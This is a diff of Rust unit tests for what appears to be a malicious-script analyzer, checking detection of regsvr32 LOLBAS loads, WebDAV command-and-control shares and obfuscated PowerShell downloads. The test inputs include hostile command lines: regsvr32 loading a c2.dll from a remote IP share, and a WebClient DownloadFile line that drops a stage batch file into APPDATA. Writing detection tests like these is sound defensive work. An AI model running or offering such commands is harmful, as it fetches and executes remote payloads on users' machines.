@@ -21570,13 +21570,13 @@ mod regsvr32_tests {
     #[test]
     fn regsvr32_plain_unc_load_target_emits_lolbas_trait_without_url() {
         let mut env = Environment::new(&Config::default());
-        interpret_line(r#"regsvr32 /s \\104.156.149.6\webdav\c2.dll"#, &mut env);
+        interpret_line(r#"regsvr32 /s \\104.156.149.6\share\c2.dll"#, &mut env);
         assert!(
             env.traits.iter().any(|t| matches!(
                 t,
                 Trait::Lolbas { name, cmd }
                     if name == "regsvr32"
-                        && cmd.contains(r#"\\104.156.149.6\webdav\c2.dll"#)
+                        && cmd.contains(r#"\\104.156.149.6\share\c2.dll"#)
             )),
             "plain UNC regsvr32 load target did not emit LOLBAS trait: {:?}",
             env.traits
@@ -21586,6 +21586,22 @@ mod regsvr32_tests {
                 .iter()
                 .any(|t| matches!(t, Trait::UrlArgument { .. })),
             "plain UNC regsvr32 target should not synthesize URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_bare_webdav_load_target_emits_url_argument() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"regsvr32 /s \\104.156.149.6\webdav\c2.dll"#, &mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == r#"regsvr32 /s \\104.156.149.6\webdav\c2.dll"#
+                        && url == "http://104.156.149.6/webdav/c2.dll"
+            )),
+            "bare WebDAV regsvr32 target did not synthesize URL: {:?}",
             env.traits
         );
     }
@@ -40252,6 +40268,36 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn deob_text_var_substring_duplicate_downloadfile_body_is_deduped() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("scheme", "https");
+        env.set("host", "github.com");
+        env.set("path", "owner/repo/raw/main/up.png");
+        crate::deob_scan::scan_deob_text(
+            r#"(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', '%APPDATA%\stage\up.bat')
+(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', '%APPDATA%\stage\up.bat')"#,
+            &mut env,
+        );
+        let downloads = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && dst.as_deref() == Some("C:\\Users\\puncher\\AppData\\Roaming\\stage\\up.bat")
+                )
+            })
+            .count();
+        assert_eq!(
+            downloads, 1,
+            "duplicate assembled DownloadFile body emitted duplicate structured Downloads: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn deob_text_var_substring_assembled_url_uses_unicode_set_bindings() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -42834,6 +42880,37 @@ mod unc_webdav_tests {
         assert!(
             has_unc,
             "bare WebDAV share was not surfaced as UncWebDavC2: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn bare_webdav_share_regsvr32_target_resolves_http_url() {
+        let script = br#"start regsvr32 \\104.156.149.6\webdav\c2.dll"#;
+        let report = analyze(script, &Config::default());
+        let has_url_arg = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { cmd, url }
+                if cmd == "regsvr32 \\\\104.156.149.6\\webdav\\c2.dll"
+                    && url == "http://104.156.149.6/webdav/c2.dll"
+            )
+        });
+        assert!(
+            has_url_arg,
+            "regsvr32 bare WebDAV share URL was not resolved: {:?}",
+            report.traits
+        );
+        let has_unc = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UncWebDavC2 { host, port, http_url, .. }
+                if host == "104.156.149.6"
+                    && port == "80"
+                    && http_url == "http://104.156.149.6/webdav/c2.dll"
+            )
+        });
+        assert!(
+            has_unc,
+            "regsvr32 bare WebDAV share was not surfaced as UncWebDavC2: {:?}",
             report.traits
         );
     }
